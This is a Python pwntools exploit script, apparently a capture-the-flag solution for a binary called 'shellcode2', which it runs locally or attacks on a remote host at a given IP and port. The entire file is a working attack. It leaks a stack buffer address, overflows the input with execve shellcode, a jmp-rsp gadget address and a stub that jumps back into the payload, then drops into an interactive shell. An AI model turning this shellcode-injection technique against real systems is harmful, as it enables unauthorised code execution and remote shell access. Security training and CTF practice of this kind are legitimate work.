from pwn import *
 
context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./shellcode2"
libc_path = "./libc.so.6"

elf, rop = ELF(vuln_path), ROP(vuln_path)
#libc, roplibc = ELF(libc_path), ROP(libc_path)

if not f_remote:
    io = process([vuln_path])
    #io = process([ld_path, vuln_path], env={"LD_PRELOAD": libc_path})
else:
    io = remote("1.95.36.136", 2104)


def ddebug(b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    pause()

#u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))

jmp_rsp_adrr=0x401380 

io.recvuntil("0x", drop=True)
buf = int(io.recvn(12), 16)

payload = b""

jump_input_asm = asm("sub rsp,0x15;jmp rsp")
log.hexdump(jump_input_asm)

ddebug("b *0x0x401376\n continue")
log.success("buf:-----> " + hex(buf))
"""
xor rsi, rsi
mov rdx, rsi
"""
shellcode = asm("""
mov esi, edi
mov edx, edi
mov edi, 0x402047   
mov al, 59
syscall
                """)
log.success("len shellcode:-----> " + str(len(shellcode)))
# payload += b"a"* 5
# payload += p64(0)
payload += shellcode.ljust(5+8, b"\x00")
payload += p64(jmp_rsp_adrr)
payload += jump_input_asm

io.sendafter("好\n", payload)

io.interactive()
